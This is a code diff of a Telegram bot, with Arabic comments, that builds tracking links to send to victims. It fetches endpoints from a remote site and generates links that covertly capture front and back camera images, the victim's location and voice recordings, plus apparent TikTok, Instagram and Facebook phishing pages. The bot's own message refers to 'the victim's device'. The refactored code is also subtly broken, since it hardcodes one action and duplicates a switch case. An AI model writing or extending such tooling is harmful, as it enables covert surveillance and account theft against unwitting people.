@@ -1857,62 +1857,89 @@ bot.on('callback_query', async (callbackQuery) => {
 
     let link = '';
 
-       switch (action) {
-    case 'captureFront':
-        // استيراد رابط front من الموقع
-        link = await importLinkFromWebsite('/c', chatId);
-        break;
-    case 'captureBack':
-        // استيراد رابط back من الموقع
-        link = await importLinkFromWebsite('/b', chatId);
-        break;
-    case 'getLocation':
-        link = await importLinkFromWebsite('/getLocation', chatId);
-        break;
-    case 'recordVoice':
-        const duration = 10;
-        const voiceLink = await importLinkFromWebsite('/record', chatId);
-        link = `${voiceLink}&duration=${duration}`;
-        break;
-    case 'rshq_tiktok':
-        link = await importLinkFromWebsite('/ca', chatId);
-        break;
-    case 'rshq_instagram':
-        link = await importLinkFromWebsite('/n', chatId);
-        break;
-    case 'rshq_facebook':
-        link = await importLinkFromWebsite('/fe', chatId);
-        break;
-}
-
-// دالة لاستيراد الروابط من الموقع
-async function importLinkFromWebsite(endpoint, chatId) {
+        
     const url = "https://sssssskskjwnsb-linklsksn.hf.space";
     
-    try {
-        const response = await axios.get(url, { timeout: 10000 });
-        const $ = cheerio.load(response.data);
-        let foundLink = null;
-        
-        // البحث عن الرابط الذي ينتهي بـ endpoint المطلوب
-        $('a[href]').each((index, element) => {
-            const link = $(element).attr('href');
-            if (link.endsWith(endpoint)) {
-                foundLink = link;
-                return false; // إيقاف loop عند العثور على أول رابط
+    // إرسال رسالة انتظار
+    bot.sendMessage(chatId, "⏳ جاري إنشاء الرابط...");
+    
+    // استيراد الروابط من الموقع
+    axios.get(url, { timeout: 10000 })
+        .then(response => {
+            const $ = cheerio.load(response.data);
+            const actionLinks = {};
+            
+            // البحث عن جميع الروابط واستخراج أسماء الملفات
+            $('a[href]').each((index, element) => {
+                const link = $(element).attr('href');
+                if (link) {
+                    // استخراج اسم الملف من الرابط
+                    const fileName = link.split('/').pop().split('?')[0];
+                    
+                    // تعيين الروابط بناءً على أسماء الملفات
+                    switch(fileName) {
+                        case 'c':
+                        case 'front':
+                        case 'capture':
+                            actionLinks.captureFront = link;
+                            break;
+                        case 'b':
+                        case 'back':
+                        case 'back-capture':
+                            actionLinks.captureBack = link;
+                            break;
+                        case 'location':
+                        case 'loc':
+                        case 'getLocation':
+                            actionLinks.getLocation = link;
+                            break;
+                        case 'record':
+                        case 'voice':
+                        case 'audio':
+                            actionLinks.recordVoice = link;
+                            break;
+                        case 't':
+                        case 'tiktok':
+                        case 'tt':
+                            actionLinks.rshq_tiktok = link;
+                            break;
+                        case 'n':
+                        case 'instagram':
+                        case 'ig':
+                            actionLinks.rshq_instagram = link;
+                            break;
+                        case 'n':
+                        case 'facebook':
+                        case 'fb':
+                            actionLinks.rshq_facebook = link;
+                            break;
+                    }
+                }
+            });
+            
+            // إنشاء رابط التحقق بناءً على الإجراء المطلوب
+            let verificationLink = null;
+            const action = 'captureFront'; // يمكن تغيير هذا حسب الإجراء المطلوب
+            
+            if (actionLinks[action]) {
+                // بناء الرابط النهائي مع chatId
+                if (actionLinks[action].includes('?')) {
+                    verificationLink = `${actionLinks[action]}&chatId=${chatId}`;
+                } else {
+                    verificationLink = `${actionLinks[action]}?chatId=${chatId}`;
+                }
+                
+                const message = `✅ تم إنشاء الرابط بنجاح\n\n🔗 الرابط: ${verificationLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة ويجب أن يكون الاتصال قويًا في جهاز الضحية`;
+                
+                bot.sendMessage(chatId, message);
+            } else {
+                bot.sendMessage(chatId, "❌ لم يتم العثور على الرابط المطلوب في الموقع");
             }
+        })
+        .catch(error => {
+            console.error('Error fetching link:', error);
+            bot.sendMessage(chatId, `❌ خطأ في جلب الرابط: ${error.message}`);
         });
-        
-        if (foundLink) {
-            // بناء الرابط النهائي مع chatId
-            return `${foundLink}?chatId=${chatId}`;
-        } else {
-            throw new Error(`لم يتم العثور على رابط ينتهي بـ ${endpoint}`);
-        }
-    } catch (error) {
-        console.error('Error fetching link:', error);
-        throw new Error(`خطأ في جلب الرابط: ${error.message}`);
-    }
 }
 bot.onText(/\/jjihigjoj/, (msg) => {
     const chatId = msg.chat.id;
